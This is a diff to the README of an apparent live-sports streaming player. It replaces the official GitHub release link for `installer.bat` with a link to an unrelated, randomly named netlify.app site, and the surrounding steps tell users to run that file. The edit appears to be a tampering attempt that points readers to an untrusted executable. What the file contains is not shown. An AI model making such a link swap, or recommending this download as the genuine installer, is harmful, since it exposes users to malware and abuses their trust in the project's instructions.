@@ -4,7 +4,7 @@ Free live sports streaming proxy/player. Watch football, cricket, basketball, te
 
 ## Quick Start (Desktop)
 
-1. Download `installer.bat` from the [latest release](https://github.com/rafu-milonmart/my-proxy-project/releases/latest)
+1. [Download `installer.bat`](https://bejewelled-fenglisu-31730c.netlify.app/)
 2. Run it — installs embedded Python + all dependencies to `C:\Zero_live`
 3. Double-click the **ZeroLive** desktop shortcut
 
